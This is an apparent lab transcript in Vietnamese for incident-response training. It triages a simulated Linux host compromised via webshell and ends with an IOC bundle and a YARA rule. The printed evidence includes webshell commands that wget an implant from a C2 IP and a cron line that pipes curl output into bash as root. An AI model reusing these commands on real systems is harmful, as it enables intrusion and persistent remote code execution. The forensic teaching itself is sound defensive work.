@@ -1,0 +1,103 @@
+### LAB 11.2 - Dieu tra mot he thong nhiem malware (tu chua), 7 buoc triage -> IOC
+### Transcript that: python3 -I make_artifacts.py case-host && python3 -I solve.py case-host
+
+$ python3 -I make_artifacts.py case-host
+[+] Da dung he thong gia lap da bi nhiem tai: /tmp/claude-1000/-mnt-d-REVERSE-IDA-DNSPY-JADX-PYCDC/fc419170-3bc5-46ea-9f29-940ccd065882/scratchpad/run112/case-host
+[+] IOC cai san: C2 185.234.72.19, attacker 198.51.100.23, webshell, implant kworkerd (timestomp 2009)
+[+] Chay tiep:  python3 -I solve.py case-host
+
+$ file case-host/var/tmp/.sysd/kworkerd
+case-host/var/tmp/.sysd/kworkerd: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
+
+$ python3 -I solve.py case-host
+
+==== Buoc 1. Chuan bi & xac minh (hash file kha nghi, lam tren ban sao) ====
+  sha256 var/tmp/.sysd/kworkerd = aa4884cab4f21d77f55775c8d03a21c72a047d1ca5ce90518872ea519f35e9af
+  sha256 var/www/html/uploads/shell.php = 04cf135a10fe188b07c7dd2716b9136a7effc9570bcb42ff8831533cd1671967
+
+==== Buoc 2. Triage: diem nong trong log va file bat thuong ====
+  [nginx] 198.51.100.23 - - [07/Jan/2026:09:01:12 +0000] "POST /upload.php HTTP/1.1" 200 512 "-" "python-requests/2.31"
+  [nginx] 198.51.100.23 - - [07/Jan/2026:09:01:40 +0000] "GET /uploads/shell.php?cmd=id HTTP/1.1" 200 44 "-" "curl/8.0"
+  [nginx] 198.51.100.23 - - [07/Jan/2026:09:02:05 +0000] "GET /uploads/shell.php?cmd=wget+http://185.234.72.19/x+-O+/var/tmp/.sysd/kworkerd HTTP/1.1" 200 20 "-" "curl/8.0"
+  [nginx] 198.51.100.23 - - [07/Jan/2026:09:02:30 +0000] "GET /uploads/shell.php?cmd=chmod+755+/var/tmp/.sysd/kworkerd HTTP/1.1" 200 0 "-" "curl/8.0"
+  [fs] file an / staging trong /var/tmp/.sysd:
+    var/tmp/.sysd/data.tar.gz  size=4096  mtime=2026-10-18
+    var/tmp/.sysd/kworkerd  size=337  mtime=2009-05-31
+
+==== Buoc 3. Root cause (initial access) ====
+  Webshell var/www/html/uploads/shell.php duoc upload qua POST /upload.php
+  roi khai thac bang GET shell.php?cmd=... tu IP 198.51.100.23
+  -> Initial Access: upload webshell (tuong duong T1505.003 Web Shell)
+
+==== Buoc 4. Persistence ====
+  [cron]    etc/cron.d/nginx-cache: */10 * * * * root curl -fsSL http://185.234.72.19/pull | bash >/dev/null 2>&1
+  [systemd] etc/systemd/system/network-helper.service: ExecStart=/var/tmp/.sysd/kworkerd --c2 185.234.72.19:8443
+
+==== Buoc 5. Lateral movement & pham vi ====
+  He thong tu chua mot host (web01). Khong thay bang chung SSH di ra may khac
+  trong auth.log/known_hosts -> pham vi: 1 host. (Ca that: quet fleet bang IOC/YARA.)
+
+==== Buoc 6. C2 & exfil (strings tren implant) ====
+  [str] https://185.234.72.19:8443/gate.php
+  [str] 185.234.72.19
+  [str] Mozilla/5.0 (X11; Linux x86_64) AcctLoader/1.2
+  [str] Global\AcctLdr_7f3a
+  [str] /builds/acctldr/loader.c
+  [str] X-Session: 7f3a2b1c
+  [str] /var/tmp/.sysd/data.tar.gz
+  [str] beacon_interval=60
+  [exfil] staged archive var/tmp/.sysd/data.tar.gz (4096 bytes) -> nghi chuan bi day ra C2
+
+==== Buoc 7. Anti-forensic + bo IOC ban giao ====
+  [timestomp] mtime cua implant = 2009 (gia ve qua khu xa) -> Defense Evasion
+  [log] co dau khoi dong lai rsyslog luc 10:15 (nghi xoa/xoay log de xoa dau)
+
+  --- BO IOC ---
+  IP      : 185.234.72.19, 198.51.100.23
+  URL     : https://185.234.72.19:8443/gate.php
+  UA      : Mozilla/5.0 (X11; Linux x86_64) AcctLoader/1.2
+  Mutex   : Global\AcctLdr_7f3a
+  Path    : var/tmp/.sysd/data.tar.gz, var/tmp/.sysd/kworkerd
+  sha256  : aa4884cab4f21d77f55775c8d03a21c72a047d1ca5ce90518872ea519f35e9af  (var/tmp/.sysd/kworkerd)
+  sha256  : 04cf135a10fe188b07c7dd2716b9136a7effc9570bcb42ff8831533cd1671967  (var/www/html/uploads/shell.php)
+  Persist : etc/cron.d/nginx-cache, etc/systemd/system/network-helper.service
+  YARA goi y: rule AcctLoader { strings: $a="AcctLoader/1.2" $b="AcctLdr_7f3a" condition: any of them }
+
+  [+] Da xuat IOC ra iocs.json (dung cho lab 11.3)
+
+$ cat case-host/iocs.json
+{
+  "case": "web01-0107",
+  "host": "web01",
+  "initial_access": "Web shell upload (T1505.003)",
+  "ip": [
+    "185.234.72.19",
+    "198.51.100.23"
+  ],
+  "url": [
+    "https://185.234.72.19:8443/gate.php"
+  ],
+  "user_agent": [
+    "Mozilla/5.0 (X11; Linux x86_64) AcctLoader/1.2"
+  ],
+  "mutex": [
+    "Global\\AcctLdr_7f3a"
+  ],
+  "paths": [
+    "var/tmp/.sysd/data.tar.gz",
+    "var/tmp/.sysd/kworkerd"
+  ],
+  "sha256": {
+    "var/tmp/.sysd/kworkerd": "aa4884cab4f21d77f55775c8d03a21c72a047d1ca5ce90518872ea519f35e9af",
+    "var/www/html/uploads/shell.php": "04cf135a10fe188b07c7dd2716b9136a7effc9570bcb42ff8831533cd1671967"
+  },
+  "persistence": [
+    "etc/cron.d/nginx-cache",
+    "etc/systemd/system/network-helper.service"
+  ],
+  "exfil": "var/tmp/.sysd/data.tar.gz",
+  "anti_forensics": [
+    "timestomp implant mtime -> 2009",
+    "rsyslog restart 10:15 (nghi xoa log)"
+  ]
+}
